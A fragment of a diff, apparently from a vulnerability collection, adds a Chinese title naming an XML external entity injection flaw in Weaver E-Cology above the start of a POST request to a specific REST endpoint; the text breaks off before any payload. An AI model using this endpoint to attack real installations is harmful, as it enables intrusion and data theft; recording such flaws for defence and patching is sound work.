@@ -1,3 +1,5 @@
+泛微E-Cology XML外部实体注入漏洞
+
 ```
 POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
 Host: 
